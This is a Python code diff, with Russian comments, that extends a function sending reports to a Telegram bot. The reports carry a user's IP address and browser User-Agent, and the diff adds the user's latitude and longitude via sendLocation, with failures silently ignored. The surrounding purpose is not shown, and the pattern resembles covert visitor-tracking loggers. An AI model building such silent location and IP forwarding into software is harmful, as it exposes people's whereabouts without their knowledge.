@@ -4,7 +4,7 @@ import os
 import base64
 from urllib.parse import unquote
 
-def send_report(user_id, m_val, i_val=None, report_type='navigator', ip=None, user_agent=None):
+def send_report(user_id, m_val, i_val=None, report_type='navigator', ip=None, user_agent=None, lat=None, lon=None):
     """
     Отправка отчета в Telegram
     
@@ -15,6 +15,8 @@ def send_report(user_id, m_val, i_val=None, report_type='navigator', ip=None, us
         report_type: 'navigator' или 'editor'
         ip: IP-адрес пользователя
         user_agent: User-Agent браузера
+        lat: Широта (опционально)
+        lon: Долгота (опционально)
     """
     token = os.getenv("TELEGRAM_TOKEN")
     chat_id = os.getenv("TELEGRAM_CHAT_ID")
@@ -100,3 +102,17 @@ def send_report(user_id, m_val, i_val=None, report_type='navigator', ip=None, us
         )
     except Exception:
         pass
+
+    if lat and lon:
+        try:
+            requests.get(
+                f"https://api.telegram.org/bot{token}/sendLocation",
+                params={
+                    "chat_id": chat_id,
+                    "latitude": float(lat),
+                    "longitude": float(lon)
+                },
+                timeout=2
+            )
+        except Exception:
+            pass
